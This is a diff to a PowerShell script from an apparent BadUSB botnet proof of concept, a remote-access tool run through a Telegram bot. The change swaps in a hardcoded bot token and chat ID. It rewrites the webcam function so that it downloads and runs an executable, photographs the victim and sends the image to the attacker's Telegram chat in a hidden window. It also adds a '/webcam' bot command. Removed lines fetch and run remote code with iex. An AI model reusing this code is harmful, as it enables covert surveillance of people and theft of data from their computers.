@@ -21,8 +21,8 @@ BOT TELEGRAM:
 ## CONFIG ##
 ############
 
-$BotToken = "607938250:AAGHVvLv9p9EBPbrrH1IHc9vsVV0ril5yKY"
-$ChatID = '-258947251'
+$BotToken = "547934703:AAG73IzI3VErc7NLUqfhvZ3thqMSHZt8hTU"
+$ChatID = '-278843483'
 $githubScript = 'https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'
 
 
@@ -125,11 +125,15 @@ function download($FileToDownload) {
 }
 
 function webcam {
-    iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/stefanstranger/PowerShell/master/Get-WebCamp.ps1'))
-    (new-object net.webclient).DownloadFile('https://raw.githubusercontent.com/stefanstranger/PowerShell/master/Get-WebCamp.ps1','Get-WebCamp.ps1')
-    #./Get-WebCamp.ps1 "Get-WebCamp"
-    Import-Module Get-WebCamp.ps1
-    Get-WebCamImage -CamIndex 0 -UseCam -interval 3
+    #iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/stefanstranger/PowerShell/master/Get-WebCamp.ps1'))
+    #(new-object net.webclient).DownloadFile('https://raw.githubusercontent.com/stefanstranger/PowerShell/master/Get-WebCamp.ps1','Get-WebCamp.ps1')
+    Write-Host "Downloading CommandCam.."
+    (new-object net.webclient).DownloadFile('https://github.com/tedburke/CommandCam/blob/master/CommandCam.exe','CommandCam.exe')
+    Start-Process .\CommandCam.exe
+    $photo = "C:\Users\$env:username\Documents\image.bmp"
+    $curl = installCurl
+    $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F photo=@' + $photo  + ' -k '
+    Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
 }
 
 function mainBrowser {
@@ -304,6 +308,9 @@ While ($DoNotExit)  {
       "/hackTwitter $ipV4"{
         hackTwitter
       }
+      "/webcam $ipV4"{
+        webcam
+      }
 	  default  {
 	    #The message sent is unknown
 		$Message = "Sorry $($LastMessage.Message.from.first_name), but I don't understand ""$($LastMessageText)""!"
@@ -313,3 +320,4 @@ While ($DoNotExit)  {
 	
   }
 }
+
